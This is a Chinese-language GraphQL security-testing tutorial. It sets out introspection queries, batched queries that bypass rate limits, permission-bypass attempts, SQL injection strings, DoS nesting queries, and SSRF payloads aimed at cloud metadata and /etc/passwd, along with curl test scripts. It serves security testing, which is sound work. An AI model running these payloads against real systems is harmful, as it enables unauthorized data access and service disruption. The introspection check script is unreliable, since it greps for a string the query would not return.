# GraphQL安全测试

## 1. 概述

GraphQL是一种API查询语言，存在特有的安全问题如内省滥用、批量查询绕过、SchemA泄露等。

**危险等级**: 中

## 2. 测试点识别

### 2.1 GraphQL端点

| 端点 | 说明 |
|------|------|
| `/graphql` | GraphQL主端点 |
| `/api/graphql` | 带前缀的GraphQL |
| `/query` | 替代端点 |

### 2.2 GraphQL识别

```bash
# 通过HTTP方法识别
POST /graphql
Content-Type: application/json
{"query": "{ __schema { types { name } } }"}

# 通过响应特征识别
{
  "data": {
    "__schema": {...}
  }
}
```

## 3. 内省查询

### 3.1 获取完整Schema

```graphql
# 内省查询
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields(includeDeprecated: true) {
        name
        args { name, type { name, kind } }
        type { name, kind }
        isDeprecated
        deprecationReason
      }
    }
  }
}
```

### 3.2 curl测试内省

```bash
#!/bin/bash
# GraphQL内省测试

TARGET="http://api/graphql"

echo "=== GraphQL内省查询测试 ==="

# 1. 检查内省是否启用
RESP=$(curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { queryType { name } } }"}')

if echo "$RESP" | grep -q "IntrospectionQuery"; then
    echo "[漏洞] 内省查询已启用，可获取完整Schema"
    echo "Schema片段: ${RESP:0:200}"
else
    echo "[安全] 内省查询被禁用"
fi

# 2. 获取所有类型
curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { types { name fields { name } } } }"}' > graphql_types.json

# 3. 获取查询字段
curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __type(name: \"Query\") { fields { name type { name } } } }"}' > graphql_queries.json
```

## 4. 批量查询绕过速率限制

### 4.1 批量查询

```graphql
# 单次查询
query { user(id: 1) { name } }

# 批量查询 - 绕过速率限制
query {
  user1: user(id: 1) { name }
  user2: user(id: 2) { name }
  user3: user(id: 3) { name }
  user4: user(id: 4) { name }
  user5: user(id: 5) { name }
}
```

### 4.2 curl批量测试

```bash
#!/bin/bash
# GraphQL批量查询绕过测试

TARGET="http://api/graphql"

echo "=== GraphQL批量查询测试 ==="

# 构造批量查询
BATCH_QUERY='{"query":"query { user1: user(id: 1) { name email } user2: user(id: 2) { name email } user3: user(id: 3) { name email } user4: user(id: 4) { name email } user5: user(id: 5) { name email } }"}'

RESP=$(curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d "$BATCH_QUERY")

if echo "$RESP" | grep -q "user1\|user2\|user3"; then
    echo "[漏洞] 批量查询成功，可绕过速率限制"
    echo "响应: $RESP"
else
    echo "[需验证] 批量查询结果不确定"
fi
```

## 5. 绕过Mutation限制

### 5.1 字段级权限绕过

```graphql
# 尝试查询隐藏字段
query {
  __type(name: "User") {
    fields {
      name
      type { name }
      args { name }
    }
  }
}

# 尝试访问管理员字段
query {
  users {
    id
    name
    isAdmin  # 隐藏字段
    secretKey  # 隐藏字段
  }
}
```

### 5.2 操作类型混淆

```graphql
# 尝试将Mutation作为Query执行
query {
  deleteUser(id: 1) {
    success
  }
}
```

## 6. GraphQL SQL注入

### 6.1 查询中的注入

```graphql
# 在查询参数中注入
query {
  user(id: "1' OR '1'='1") {
    id
    name
  }
}

# 在过滤条件中注入
query {
  users(filter: "{'name': {'_like': \"%admin%\"}}") {
    id
    name
  }
}
```

### 6.2 Mutation中的注入

```graphql
mutation {
  createUser(input: {
    name: "admin'--"
    email: "test@test.com"
  }) {
    id
    name
  }
}
```

## 7. 拒绝服务(DoS)

### 7.1 深度嵌套查询

```graphql
# 深度嵌套
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            id
          }
        }
      }
    }
  }
}
```

### 7.2 重复字段查询

```graphql
# 查询大量重复字段
query {
  users {
    id id id id id id id id id id
    name name name name name name name name name name
  }
}
```

### 7.3 资源密集型查询

```graphql
# 全表扫描
query {
  users(orderBy: {field: "name", order: DESC}, limit: 1000000) {
    id
    name
  }
}
```

## 8. SSRF through GraphQL

### 8.1 在URL字段中注入

```graphql
mutation {
  createWebhook(input: {
    url: "http://169.254.169.254/latest/meta-data/"
    name: "test"
  }) {
    id
    url
  }
}
```

### 8.2 在文件上传中注入

```graphql
mutation {
  uploadFile(input: {
    url: "file:///etc/passwd"
    name: "test"
  }) {
    id
  }
}
```

## 9. GraphQL误报判断标准

### 9.1 核心判断原则

```
【重要】GraphQL测试需要理解其查询机制

判断逻辑：
1. 内省启用 → 不是漏洞，是开发特性
2. 批量查询 → 可能绕过速率限制
3. 嵌套查询 → 可能导致DoS

【真实漏洞特征】
- 批量查询绕过速率限制
- 深度嵌套导致DoS
- 权限字段被暴露
- SQL/NoSQL注入
```

### 9.2 curl测试模板

```bash
#!/bin/bash
# GraphQL安全测试模板

TARGET="http://api/graphql"

echo "=== GraphQL安全测试 ==="

# 1. 内省测试
echo "[1] 内省测试"
curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { queryType { name } } }"}'

# 2. 获取所有类型
echo ""
echo "[2] 获取所有类型"
curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { types { name kind } } }"}'

# 3. 批量查询测试
echo ""
echo "[3] 批量查询测试"
curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"query":"query { u1: user(id:1){name} u2: user(id:2){name} u3: user(id:3){name} }"}'

# 4. 嵌套查询测试
echo ""
echo "[4] 嵌套查询测试"
curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"query":"query { user(id:1) { friends { friends { friends { id } } } } }"}'
```

## 10. 测试检查清单

```
□ 识别GraphQL端点
□ 测试内省查询
□ 获取完整Schema
□ 测试批量查询绕过
□ 测试嵌套查询DoS
□ 测试字段级权限绕过
□ 测试SQL/NoSQL注入
□ 测试SSRF
□ 测试速率限制
□ 评估GraphQL安全配置
```
